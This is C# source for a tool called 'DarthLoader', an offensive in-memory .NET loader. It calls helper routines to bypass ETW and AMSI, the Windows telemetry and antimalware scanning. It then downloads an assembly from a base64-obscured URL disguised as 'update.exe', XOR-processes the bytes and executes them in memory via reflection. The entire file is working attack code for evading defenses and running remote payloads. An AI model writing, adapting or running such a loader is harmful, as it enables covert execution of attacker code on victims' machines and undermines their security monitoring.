using System.Net;
using System.Reflection;
using System;
using System.Threading;


namespace DarthLoader
{
    class Program
    {
        // download a .Net assembly and xor encrypt the bytes
        static byte[] PrepareRemoteAssembly(string url, int count, string xorKey = "")
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient webClient = new WebClient();
            byte[] programBytes = null;
            while (count >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = Utilities.Xor(webClient.DownloadData(url), xorKey);
                }
                catch (WebException)
                {
                    Console.WriteLine("[!] Assembly not found!");
                    Console.WriteLine($"[+] Retrying download...");
                    count--;
                    Thread.Sleep(1000);
                }
            }
            return programBytes;
        }

        // load, decrypt and execute assembly bytes
        static void ExecuteAssembly(byte[] programBytes)
        {
            try
            {
                Assembly dotNetProgram = Assembly.Load(programBytes);
                string[] parameters = new string[] { null }; // add params if needed
                dotNetProgram.EntryPoint.Invoke(null, new object[] { parameters });
            }
            catch (TargetInvocationException)
            {
                Console.WriteLine("[!] Missing arguments for loaded assembly!");
                Environment.Exit(-1);
            }            
        }

        static void Main(string[] args)
        {
            try
            {
                string key = args[0];
                string retryCount = args[1];

                Utilities.BypassETW();
                Utilities.BypassAMSI();

                Console.WriteLine($"[*] Downloading and encrypting assembly with the key: {key}");
                byte[] programBytes = PrepareRemoteAssembly(Utilities.Base64Decode("aHR0cDovLzEwLjEwLjEuNDAvdXBkYXRlLmV4ZQ=="), Int32.Parse(retryCount), key);
                Console.WriteLine("[!] .Net assembly downloaded!");

                Console.WriteLine("[*] Decrypting and executing assembly...");
                ExecuteAssembly(Utilities.Xor(programBytes, key));
            }
            catch (IndexOutOfRangeException)
            {
                Console.WriteLine("[!] Missing argument Xor key or retry counter!");
                Environment.Exit(-1);
            }
        }
    }
}
